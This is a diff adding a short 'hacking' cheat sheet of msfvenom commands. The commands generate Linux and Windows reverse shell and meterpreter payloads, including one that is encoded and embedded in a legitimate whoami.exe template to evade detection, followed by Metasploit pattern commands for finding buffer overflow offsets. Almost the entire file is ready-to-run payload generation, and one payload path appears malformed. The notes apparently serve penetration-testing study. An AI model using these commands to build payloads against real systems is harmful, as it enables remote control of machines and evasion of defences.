@@ -1,0 +1,29 @@
+---
+tags: [ hacking ]
+---
+# Basic linux reverse shell (use linux/x86/shell/reverse_tcp for staged)
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f elf -o pwnd
+
+# Basic linux meterpreter reverse shell (use linux/x86/shell/reverse_tcp for staged)
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f elf -o pwnd
+
+# Basic windows reverse shell (use windows/shell/reverse_tcp for staged)
+msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 --arch x86 -f exe -o test.exe
+
+# Basic windows meterpreter reverse shell (use windows/shell/reverse_tcp for staged)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 --arch x86 -f exe -o test.exe
+
+# Windows reverse shell with encoding and template from valid exe
+msfvenom -p windows/windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/whoami.exe -o whoami.exe
+
+# Windows reverse shell to hex
+msfvenom -p windows/x64/shell_reverse_tcp -f hex EXITFUNC=thread LHOST=127.0.0.1 LPORT=443
+
+# Set architecture
+msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=127.0.0.1 --platform windows -a x64 --format raw -o x64_payload.bin
+
+# Create pattern
+msf-pattern_create -l 4379
+
+# Search pattern
+msf-pattern_offset -l 4379 -q 42306142
